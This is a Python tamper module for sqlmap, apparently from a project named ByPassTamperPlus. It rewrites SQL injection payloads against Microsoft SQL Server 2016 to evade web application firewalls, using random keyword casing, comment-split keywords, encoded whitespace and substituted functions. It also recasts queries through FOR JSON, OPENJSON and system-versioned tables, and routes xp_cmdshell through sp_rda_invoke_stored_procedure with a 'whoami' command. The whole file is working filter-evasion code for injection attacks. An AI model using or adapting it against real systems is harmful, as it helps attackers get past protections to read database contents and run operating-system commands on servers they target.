#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2016_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|JSON|PATH|OPENJSON|VALUE|SPLIT|SYSTEM_TIME|ALL|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL|SP_RDA_INVOKE_STORED_PROCEDURE)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "USER_NAME()" in payload.upper():
        payload = payload.replace("USER_NAME()", "(SELECT USER_NAME() AS u FOR JSON PATH)")

    if "DB_NAME()" in payload.upper():
        payload = payload.replace("DB_NAME()", "(SELECT value FROM STRING_SPLIT(DB_NAME(), '_') WHERE 1=1)")

    if "sys.tables" in payload.lower():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+sys.tables", r"SELECT * FROM OPENJSON((SELECT \1 FROM sys.tables FOR JSON PATH)) WITH (\1 NVARCHAR(100) '$. \1')", payload)

    if "FROM" in payload.upper() and "FOR SYSTEM_TIME" not in payload.upper():
        payload = re.sub(r"(?i)FROM\s+([\w\.]+)", r"FROM \1 FOR SYSTEM_TIME ALL", payload)

    if "xp_cmdshell" in payload.lower():
        payload = payload.replace("xp_cmdshell", "sp_rda_invoke_stored_procedure @procedure_name='xp_cmdshell', @arguments='whoami'")

    payload = general_obfuscate(payload)

    return payload
